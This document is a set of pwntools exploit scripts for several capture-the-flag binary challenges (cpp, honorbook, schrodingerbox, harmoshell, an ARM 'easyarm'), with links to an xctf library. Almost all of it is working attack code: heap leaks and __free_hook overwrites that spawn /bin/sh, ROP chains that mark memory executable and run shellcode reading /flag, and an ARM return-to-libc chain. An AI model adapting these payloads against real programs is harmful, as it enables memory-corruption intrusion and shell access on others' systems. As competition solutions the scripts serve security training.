'''
one:https://www.xctf.org.cn/library/details/b69108559ccd6ff0fa3ec79e3f2f198f121e90a8/
two:https://www.xctf.org.cn/library/details/55599c9c17ea0e8ca0b094adbe075a03a7321599/
three:https://www.xctf.org.cn/library/details/5acdc1c31cf4935ac38fce445978888a5710cf11/
'''


#----------cpp--------------
from pwn import *
​
context(log_level='debug')
sh = process("chall")
e = ELF("libc-2.31.so")
gdb.attach(sh)
​
def make_unique(idx, data):
sh.sendline('0')
sh.sendlineafter('> ', data)
sh.sendlineafter('> ', str(idx))
sh.recvuntil('> ')
​
def release(idx, data):
sh.sendline('1')
sh.sendlineafter('> ', str(idx))
ret = sh.recvuntil('> ')
sh.sendline(data)
sh.recvuntil('> ')
return ret[:ret.find('\n')]
​
sh.recvuntil('> ')
​
for i in range(0, 0xc0):
make_unique(i, str(i))
​
release(0, '\x00' * 7)
leak = release(1, '\x00' * 7)
heap_addr = u64(leak+'\x00\x00')
print(hex(heap_addr))
​
release(2, p64(heap_addr + 0x58)[:7])
make_unique(0xc0, "cons")
make_unique(0xc1, p16(0x501))
leak = release(3, '\x00' * 7)
​
libc_addr = u64(leak+'\x00\x00') - 0x1ebbe0
print(hex(libc_addr))
​
release(6, '\x00' * 7)
release(7, p64(libc_addr + e.symbols["__free_hook"])[:7])
​
make_unique(0xc2, "/bin/sh")
make_unique(0xc3, p64(libc_addr + e.symbols["system"])[:7])
​
sh.sendline('1')
sh.sendlineafter('> ', str(0xc2))
​
sh.interactive()

#-------------honorbook--------------
from pwn import *

remote_addr=['',0] # 23333 for ubuntu16, 23334 for 18, 23335 for 19
#context.log_level=True

is_remote = False
elf_path = "./honorbook"
elf = ELF(elf_path)
#libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
libc = ELF("./libs/lib/libc-2.27.so")

context.terminal = ["tmux", "new-window"]
if is_remote:
    p=remote(remote_addr[0],remote_addr[1])
else:
    p = process(["qemu-riscv64", "-L", "./libs", elf_path], aslr = True)


ru = lambda x : p.recvuntil(x)
sn = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)

def lg(s,addr = None):
    if addr:
        print('\033[1;31;40m[+]  %-15s  --> 0x%8x\033[0m'%(s,addr))
    else:
        print('\033[1;32;40m[-]  %-20s \033[0m'%(s))

def raddr(a=6):
    if(a==6):
        return u64(rv(a).ljust(8,'\x00'))
    else:
        return u64(rl().strip('\n').ljust(8,'\x00'))

def choice(idx):
    sla(": ", str(idx))

def add(idx, name, msg):
    choice(1)
    choice(idx)
    sa(": ", name)
    sa(": ", msg)

def echo(filename, content, is_append = False):
    sleep(1)
    sn(content)

def rm(idx):
    choice(2)
    choice(idx)

def show(idx):
    choice(3)
    choice(idx)

def edit(idx, msg):
    choice(4)
    sa(": ", msg)

if __name__ == '__main__':
    lg("libc", 0x4000aad768 - libc.symbols['_IO_2_1_stdin_'])
    for i in range(11):
        add(i, str(i), "AA\n")
    for i in range(10):
        rm(i)
    choice("0"*0x500+'123')
    for i in range(10):
        add(i, str(i), "AA\n")

    show(7)
    ru(": ")

    #libc_addr = raddr() - 0x3ec037 + 0x100
    libc_addr = u64(rv(3).ljust(8, '\x00')) + 0x4000000000 - 0x107d37 #- libc.symbols['_IO_2_1_stdin_']
    libc.address = libc_addr
    lg("libc addr", libc_addr)
    ru("Code")
    #p.interactive()
    add(21, 'BB', "CC\n")
    add(22, 'BB', p64(0x21)*(0xe0/8) + '\n')
    rm(21)
    add(21, 'BB', "C"*0xe8 + p8(0xf0))
    rm(0)
    rm(1)
    rm(22)
    add(23, '/bin/sh\x00', p64(libc.symbols['__free_hook'])*(0xe0/8) + '\n')
    add(24, 'BB', "/bin/sh\x00\n")
    add(25, 'BB', p64(libc.symbols['system']) + '\n')
    rm(24)

    p.interactive()

    #-------------schrodingerbox-------------
    #!/usr/bin/python3
from pwn import *

p = remote('127.0.0.1', 52520)

# NOTE : This won't work if you launch it locally like p=process('./easteregg')

xchg = 0x49E61B
poprax = 0x0000000000420382
poprdi = 0x0000000000400726
poprsi = 0x000000000040167f
poprdx = 0x000000000047de66
incrax = 0x0000000000501750
poprbx = 0x00000000004072a9
syscall = 0x4C78E5

context.arch = 'amd64'


def create(type='small'):
    p.sendlineafter('5.quit', '1')
    p.sendlineafter('?', type)


def view(idx):
    p.sendlineafter('5.quit', '4')
    p.sendlineafter('?', str(idx))


for x in range(10):
    create()
p.sendlineafter('5.quit', b'2-------' + p64(0x1e3fb0)[:-1])  # here is the key to take advantage of uninitialized bug
p.sendlineafter('?', '9')
dsize = 0x1e3ef0 + 1

p.sendlineafter('?', str(dsize))

p.send('x' * dsize)

view(9)

p.recvuntil('x' * dsize)
heap = (u64(p.recvuntil(' ', drop=1).ljust(8, b'\x00')) << 8) - 0x1eeab8
log.success('heap:' + hex(heap))

payload = b'\x00' * 0x20 + p64(0x00000000004488f8)  # add rsp, 0x48 ; ret
payload = payload.ljust(0x58, b'\x00')
payload += p64(xchg)
payload += p64(0) * 2
# NOTE : Since our program has been "traced", execve to new shell won't work as well.:)
# ================ROP START==================
payload += p64(poprax)
payload += p64(9)
payload += p64(incrax)
payload += p64(poprdi)
payload += p64(heap & 0xfffffffffffff000)
payload += p64(poprsi)
payload += p64(0x1000)
payload += p64(poprdx)
payload += p64(7)
payload += p64(syscall)
payload += p64(heap + 0xb8) * 3
# ================ROP END====================
payload += asm(shellcraft.amd64.linux.cat('/flag'))  # modify it to your flag file path

payload = payload.ljust(0x1e3ed8, b'n')
payload += p64(0x200000)  # Some stuffs that I don't know :)
payload += p64(0)
payload += p64(0x3a0efff)
payload += p64(heap + 0x1eeab8)
payload += p64(0x1f5400)
payload += b'\x00' * 16
payload += p64(heap - 0x41c138)
payload = payload.ljust(0x1e3fa0, b'\x00')
payload += p64(heap)  # This is actually extent_hook

p.sendlineafter('5.quit', b'2-------' + p64(0x1e3fa8)[:-1])  # here is the key to take advantage of uninitialized bug
p.sendlineafter('?', '9')
p.sendlineafter('?', str(0x1e3fa8))
p.send(payload)

# gdb.attach(p, 'b *0x4BF25A')
p.sendlineafter('5.quit', '1')
p.sendlineafter('?', 'large')  # trigger shellcode
p.interactive()

#------------harmoshell-1------------
from pwn import *
​
remote_addr=['localhost', 22555] # 23333 for ubuntu16, 23334 for 18, 23335 for 19
#context.log_level=True
​
is_remote = True
​
elf_path = "./harmoshell"
elf = ELF(elf_path)
libc = ELF("./libs/lib/libc-2.27.so")
​
if is_remote:
   p=remote(remote_addr[0],remote_addr[1])
else:
   p = process(["qemu-riscv64", "-L", "./libs", elf_path], aslr = True)
​
​
context.terminal = ["tmux", "new-window"]
#p = process(elf_path, aslr = False)
#p = process(["./qemu-riscv64", "-g", "12345" ,"-L", "/usr/riscv64-linux-gnu", elf_path], aslr = True)
​
​
ru = lambda x : p.recvuntil(x)
sn = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
​
def lg(s,addr = None):
   if addr:
       print('\033[1;31;40m[+] %-15s --> 0x%8x\033[0m'%(s,addr))
   else:
       print('\033[1;32;40m[-] %-20s \033[0m'%(s))
​
def raddr(a=6):
   if(a==6):
       return u64(rv(a).ljust(8,'\x00'))
   else:
       return u64(rl().strip('\n').ljust(8,'\x00'))
​
def choice(idx):
   sla("$ ", str(idx))
​
def touchfile(filename):
   choice("touch " + filename)
​
def echo(filename, content, is_append = False):
   if is_append == True:
       choice("echo >> " + filename)
   else:
       choice("echo > " + filename)
   sleep(1)
   sn(content)
​
def rm(filename):
   choice("rm " + filename)
​
def show(filename):
   choice("cat " + filename)
   ru("Content: ")
​
if __name__ == '__main__':
   for i in range(20):
       touchfile('B' + hex(i)[2:])
​
   for i in range(20):
       rm('B' + hex(i)[2:])
​
   #gdb.attach(p)
   #raw_input()
   for i in range(8):
       touchfile('B' + hex(i)[2:])
​
   #echo("B7", 'A'*8)
   show('B7')
   libc_addr = u64(rl().strip().ljust(8, '\x00')) + 0x4000000000 - 0x1079f8 # - (0x4000aad768 - libc.symbols['_IO_2_1_stdin_'])
   lg("libc", libc_addr)
   libc.address = libc_addr
​
   read_got = 0x13060
   read_plt = 0x10dc0
   touchfile("AAA")
​
   buf = read_plt + 0x300
   pop_init = 0x1182c
   call_3_arg = 0x11812
   mov_s3_a0 = 0x115d8
   system_addr = libc.symbols['system']
   sh_addr = libc.search("/bin/sh\x00").next()
   payload = p64(0)
   payload += p64(0x100) #arg3
   payload += p64(buf) #arg3
   payload += p64(sh_addr) #arg3
   payload += p64(sh_addr) #arg3
   payload += p64(sh_addr) #arg3
   payload += p64(sh_addr) #arg3
   payload += p64(mov_s3_a0) #arg3
   payload += p64(system_addr)*10
​
​
   lg("system_addr", system_addr)
   echo("BBB", cyclic(0x100+56) + p64(pop_init) + payload)
​
   p.interactive()


#------------harmoshell-2----------
from pwn import *
​
remote_addr=['',0] # 23333 for ubuntu16, 23334 for 18, 23335 for 19
#context.log_level=True
​
is_remote = False
elf_path = "./harmoshell2"
elf = ELF(elf_path)
libc = ELF("./libs/lib/libc-2.27.so")
​
context.terminal = ["tmux", "new-window"]
if is_remote:
   p=remote(remote_addr[0],remote_addr[1])
else:
   p = process(["qemu-riscv64", "-L", "./libs", elf_path], aslr = True)
​
​
ru = lambda x : p.recvuntil(x)
sn = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
​
def lg(s,addr = None):
   if addr:
       print('\033[1;31;40m[+] %-15s --> 0x%8x\033[0m'%(s,addr))
   else:
       print('\033[1;32;40m[-] %-20s \033[0m'%(s))
​
def raddr(a=6):
   if(a==6):
       return u64(rv(a).ljust(8,'\x00'))
   else:
       return u64(rl().strip('\n').ljust(8,'\x00'))
​
def choice(idx):
   sla("$ ", str(idx))
​
def touchfile(filename):
   choice("touch " + filename)
​
def echo(filename, content, is_append = False):
   if is_append == True:
       choice("echo >> " + filename)
   else:
       choice("echo > " + filename)
   sleep(1)
   sn(content)
​
def rm(filename):
   choice("rm " + filename)
​
def show(filename):
   choice("cat " + filename)
   ru("Content: ")
​
if __name__ == '__main__':
   for i in range(20):
       touchfile('B' + hex(i)[2:])
​
   for i in range(20):
       rm('B' + hex(i)[2:])
​
   for i in range(8):
       touchfile('B' + hex(i)[2:])
​
   show('B7')
   libc_addr = u64(rl().strip().ljust(8, '\x00')) + 0x4000000000 - 0x1079f8 # - (0x4000aad768 - libc.symbols['_IO_2_1_stdin_'])
   #libc_addr = raddr() - 0x3ebca0
   lg("libc", libc_addr)
   libc.address = libc_addr
​
   echo("B2", '/bin/sh\x00' + "A"*0xf8)
   echo("B2", p64(0)*2 + 'B'*8 + p64(0) + p64(libc.symbols['__free_hook']), True)
   echo('B'*8, p64(libc.symbols['system']))
   rm('B2')
   p.interactive()

#-----------pwnit(easyarm)------------
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
from pwn import *
​
#binary = ['qemu-arm-static', '-g', '1234', '-L', './', './a.out']
binary = ['qemu-arm-static', '-L', './', './a.out']
​
io = process(binary, aslr = 1)
context.log_level = 'debug'
​
myu64 = lambda x: u64(x.ljust(8, '\0'))
ub_offset = 0x3c4b30
codebase = 0x555555554000
​
io.recvuntil("input: ")
g1 = 0x10540
g2 = 0x10548
printf_got = 0x0002100C
main = 0x104a0
​
​
buf = b'a' * 0x100 + p32(0xdeadbeef) + p32(g1)
buf += p32(printf_got) # r4
buf += p32(1) #r5
buf += p32(printf_got) #r6 = r0
buf += p32(0) #r7 = r1
buf += p32(0) #r8 = r2
buf += p32(0) #r9
buf += p32(0) #r10
buf += p32(g2) #pc
​
buf += p32(0) * 7 + p32(main)
io.sendline(buf)
​
libc_addr = u32(io.recvn(4)) - 250780
log.info("\033[33m" + hex(libc_addr) + "\033[0m")
system_addr = libc_addr + 215056
sh_addr = libc_addr + 1042529
​
pop_r0_r4_pc = libc_addr + 0x0006beec
buf = b'a' * 0x100 + p32(0xdeadbeef) + p32(pop_r0_r4_pc) + p32(sh_addr) + p32(0) + p32(system_addr)
io.sendline(buf)
​
​
io.interactive()